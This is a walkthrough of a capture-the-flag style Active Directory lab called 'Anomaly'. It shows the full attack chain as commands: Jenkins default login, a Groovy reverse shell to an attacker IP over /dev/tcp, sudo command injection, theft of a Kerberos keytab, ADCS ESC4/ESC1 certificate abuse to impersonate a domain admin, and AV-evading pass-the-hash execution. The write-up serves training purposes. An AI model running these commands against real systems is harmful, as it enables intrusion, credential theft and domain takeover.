---
title: "HackSmarter Anomaly Walkthrough  "
date: 2026-05-30 00:00:00 +0000
categories: [ HackSmarterlabs]
tags: [Hacksmarterlabs , Active Directory]
---


<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/d15cce12-4ef3-4aca-893f-983644a24dbc" />


## Objective :
The core objective is to demonstrate the full impact of a successful network intrusion by achieving Domain Administrator privileges over the client's Active Directory environment. The test will simulate a motivated external attacker's progression from an initial foothold to complete administrative control.

## Scope
The in-scope assets for this engagement include two critical IP addresses:

A hardened Ubuntu Server (Initial Foothold Target).
The primary Domain Controller (Final Privilege Escalation Target).
It is a critical finding that the Domain Controller is running active Antivirus (AV) software; therefore, this test will specifically involve techniques to bypass or evade the installed AV to successfully compromise the domain and demonstrate the potential for a full domain compromise.


## Solution : 

We first scan both machines for open ports . First we start with the Ubuntu machine : 

<img width="1066" height="497" alt="image" src="https://github.com/user-attachments/assets/668545e7-5af5-4862-9d57-b33cc8bd1f73" />

then for the DC , i ran a more detailed scan . 

<img width="1627" height="602" alt="image" src="https://github.com/user-attachments/assets/aac148c1-d32d-4ca3-b5cb-19bfcee5d1af" />

First i will start with the Ubuntu machine . 

### Ubuntu machine : 

If we visit port 8080 on the ubuntu machine  , we find a Jenkins server running . 

<img width="1492" height="548" alt="image" src="https://github.com/user-attachments/assets/2d7f0664-1f92-40c4-a453-4cd32bfc6e25" />

Looking online , the default creds for Jenkins are admin:admin , Luckily for us they're still using the default creds , so we are able to login . 

<img width="1907" height="771" alt="image" src="https://github.com/user-attachments/assets/e63b7f6d-1282-4d1e-bc2f-aecb9b389b73" />

Since we are admin on the jenkins server , it's easy to get a reverse shell by executing code via the Script Console :

<img width="1049" height="747" alt="image" src="https://github.com/user-attachments/assets/adb17b29-fa91-4780-9336-07562df5e68c" />

```bash
==> Inside the script console :

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.200.61.36/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

==> On ur Kali :
nc -lnvp 8443

```bash

<img width="1599" height="640" alt="image" src="https://github.com/user-attachments/assets/601bc81d-89e8-4db9-8d33-5e37e59b0e80" />

We'll just stabilize our shell , usually i use python for this , but this time it didn't work , so i used script instead :

```bash
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
export TERM=xterm
PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$' : (This is just for colour)
```

<img width="1182" height="679" alt="image" src="https://github.com/user-attachments/assets/c1f3f516-8d0b-41d7-8003-fd46dbfa6860" />

Now first thing i like to check once i get access to a linux machine is the SUIDs as well as the binaries we can run as root without password (sudo -l):

<img width="1232" height="637" alt="image" src="https://github.com/user-attachments/assets/c8ea07e6-3f91-45e3-b2ab-241c525dd802" />

We see that we're able to run the binary router_config as root without password , this is a custom program so won't find any exploits on GTFOBINS , i tried running it normally to see how it would usually work , apparently it takes our file and apply some kind of configurations to it . 

To analyze it better i transfered it back to my kali machine and put it inside Ghidra to try and reverse engineer it . 

<img width="1385" height="646" alt="image" src="https://github.com/user-attachments/assets/d229328e-5e33-4eab-bbd7-7ab349599e98" />

We see that our parameter is taken directly and passed though the system command , we can try Command injection in this case . 

<img width="885" height="200" alt="image" src="https://github.com/user-attachments/assets/628dbbe5-9e72-4c16-b492-d03d19626f58" />

Perfect , we can either make bash an SUID then do bash -p or just execute Bash as root through the binary . 

<img width="942" height="325" alt="image" src="https://github.com/user-attachments/assets/364ed798-64b1-48a1-a286-bec2d53b4c30" />

Just like that we get our user flag . Before moving to the DC , i tried searching for some creds in notes or in a specific folder but i couldn't fine anything . 

In a Domain Joined machine , once we fully compromise it , it's always good to check Kerberos related Files , specially that we see Port 88 open on the DC so we know that Kerberos is open .

These files are : 
/etc/krb5.conf — reveals the realm, KDC address, and confirms AD domain membership
/etc/krb5.keytab — if readable, contains principal keys that allow direct TGT requests without knowing the password

Now all we should do is transfer these 2 files back to our Kali machine , and from there use klist to first get the Principle name , and then generate  TGT on his behalf using the AES key inside his keytab file , and finally we use the ticket stored in our ccache to authenticate and enumerate the domain further.

Now First , we copy the kerb.conf file to our /etc/kerb.conf , krb5.conf tells your Kali where the KDC is. Without it your Kali has no idea where the domain ANOMALY.HSM is.

Then we use klist to get the principle name from the Keytab file : 

```bash
klist -kt krb5.keytab 
```
<img width="849" height="327" alt="image" src="https://github.com/user-attachments/assets/b92f3954-798b-4e10-ad3c-8ba5eabfd803" />

We got the Principle name , now we can use kinit to request a TGT on his behalf using his Keytab file . 

```bash
==> Request the TGT :
kinit -kt krb5.keytab Brandon_Boyd@ANOMALY.HSM

==> To verify the TGT was imported :
klist 
```

<img width="1021" height="630" alt="image" src="https://github.com/user-attachments/assets/d8e8ea81-8cb9-4748-9b90-db16399a92a3" />

Now we export the path to our ccache file via KRB5CCNAME, so that nxc knows where to look for the TGT once we reference it with --use-kcache : 

```bash
export KRB5CCNAME=/tmp/krb5cc_1000
nxc smb Anomaly-DC.anomaly.hsm -u 'Brandon_Boyd' -k --use-kcache
```

<img width="1018" height="509" alt="image" src="https://github.com/user-attachments/assets/b9452f31-03ce-4697-871a-9eef704a5903" />

Perfect , now we're all set , we can move to the DC .

### Domain Controller :

First thing i like to do is generate a list of all users on the domain to try attacks like ASREPROASTING , or just read their desctiptiion (for this we need nxc with ldap not smb) .

<img width="1780" height="446" alt="image" src="https://github.com/user-attachments/assets/f098c0b8-e8df-4ba8-a328-85f6b0d0ad08" />

Perfect we found the user's password in the description field , now we can start using it instead of the TGT (doesn't make that much difference , with a TGT nxc ingestor won't work for Bloodhound so we will need an alternative , but we can use the password instead in our case )

Now i first tried checking the shares , but there were only the default ones :

<img width="1424" height="535" alt="image" src="https://github.com/user-attachments/assets/69de2f93-4fa8-4655-8b66-db37b648fa99" />

!!!! Forgot to mention , but before we do any of this it's always better to add the Domain name as well as the Hostname to our /etc/hosts file . 

<img width="1070" height="398" alt="image" src="https://github.com/user-attachments/assets/93dddd3a-ccad-4a6a-a0a2-046df33f95df" />

Now let's go back to our enumeration , our user can't login to the machine , so the only option left is through BloodHound , before checking for certificate template misconfigurations , since we have an ADCS in place . 

<img width="1469" height="580" alt="image" src="https://github.com/user-attachments/assets/78a0b87e-34da-4245-82df-a16e2fb534d1" />

No Outbound Objects Control , the groups aren't interesting either , so we move to ADCS attacks . 

```bash
certipy-ad find -u 'Brandon_Boyd@ANOMALY.HSM' -p '3edc4rfv#EDC$RFV' -dc-ip $target -target ANOMALY-DC.anomaly.hsm -vulnerable
```

<img width="1709" height="677" alt="image" src="https://github.com/user-attachments/assets/0362e602-f0b0-4090-8ed7-5c487fe2c057" />

Perfect , we found an ESC4 and ESC1 as well .

<img width="1411" height="509" alt="image" src="https://github.com/user-attachments/assets/900f988a-34dc-409a-93d9-8a208ce5cb10" />

But if we look closely at the output , besides the Domain Admins and Enterprise Admins ,only Domain computers are allowed to modify the template (Full control over it ).  

<img width="1240" height="687" alt="image" src="https://github.com/user-attachments/assets/026d727c-aa81-441c-83be-2122d2d6b214" />

Now this shouldn't be a problem since by default every user is able to create up to 10 machine accounts , we can create one and use that to modify the template and perfom our ESC4 . 

To create the machine account i used Bloodyad . 

```bash
bloodyad  -d 'anomaly.hsm' -u 'Brandon_Boyd' -p '3edc4rfv#EDC$RFV' --host 'Anomaly-DC.anomaly.hsm' add computer 'Test' 'WEAK123.'    
```

<img width="1773" height="369" alt="image" src="https://github.com/user-attachments/assets/30f44f5e-88c7-4e76-9d9e-1ae0bd172272" />

We can see that our machine account was created successfully. Now we use certipy to modify the CertAdmin template to make it vulnerable to ESC1 , this is the ESC4 attack, abusing write permissions on the template object. From there we request a certificate impersonating a Domain Admin (ANNA_MOLLY), then use certipy auth to exchange that certificate for a TGT and NTLM hash, giving us full domain access.

(To save time , i tried first to get the TGT for the Administrator user but apprently the account was disabled so it didn't work ) . 

```bash
certipy auth -pfx 'administrator.pfx'
→ KDC_ERR_CLIENT_REVOKED  ← account disabled/locked
```bash

Now back to our attack chain :

```bash
==> First we modify the template to make it vulnerable :

certipy-ad template -target 'Anomaly-DC.anomaly.hsm' \
  -u 'TEST$@anomaly.hsm' -p 'WEAK123.' \
  -dc-ip $target -template 'CertAdmin' \
  -write-default-configuration

==> Get the DA SID (Molly in our case ) :
bloodyAD -d 'anomaly.hsm' -u 'Brandon_Boyd' -p ''3edc4rfv#EDC$RFV'' \
  --host 'Anomaly-DC.anomaly.hsm' get object 'ANNA_MOLLY' --attr objectSid

==> Request cert impersonating DA (ESC1)
certipy-ad req -target 'Anomaly-DC.anomaly.hsm' \
  -u 'TEST$@anomaly.hsm' -p 'WEAK123.' \
  -dc-ip $target \
  -ca 'anomaly-ANOMALY-DC-CA-2' -template 'CertAdmin' \
  -upn 'ANNA_MOLLY@anomaly.hsm' \
  -sid 'S-1-5-21-1496966362-3320961333-4044918980-1105'

==> Authenticate → TGT + NTLM hash
certipy-ad auth -pfx 'anna_molly.pfx' -dc-ip $target

```bash

<img width="1341" height="721" alt="image" src="https://github.com/user-attachments/assets/bc8d5784-adc6-458e-8eca-6653f3c5c7a1" />

Now that it is updated we get the SID :

<img width="1906" height="343" alt="image" src="https://github.com/user-attachments/assets/9a6fc5cf-6282-445a-9b67-90198c4a09fc" />

Now we just request the certificate and authenticate using it :

<img width="1243" height="799" alt="image" src="https://github.com/user-attachments/assets/65790a88-c3b1-4e4d-975b-ebdf00cc3b0f" />

Looking at the initial scan , we know Winrm isn't open , we can use impacket wmi instead , it will allow us to connect and execute code on the target via WMI .

<img width="1570" height="380" alt="image" src="https://github.com/user-attachments/assets/aff982b3-0e94-4ab3-9bec-ed54758139a5" />

It just hangs , this is probably due to the fact that an AV is in place which blocks known signatures for tools like WMIexec .

I found this tool , wmiexec2 , which is a stealthier version , designed to bypass the AV detection , we will use it instead : 

```bash
https://github.com/ice-wzl/wmiexec2
git clone https://github.com/ice-wzl/wmiexec2.git
cd wmiexec2/
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
python3 wmiexec2.py anomaly.hsm/anna_molly@$target -hashes ':be4bf3131851aee9a424c58e02879f6e'
```

<img width="999" height="692" alt="image" src="https://github.com/user-attachments/assets/ea6fcaf1-f5d1-4d25-a421-bfae3b30896c" />

The root flag is always in the administrator Desktop . 

That was all for this Lab , hope you learned something from it , see you in the next one :)
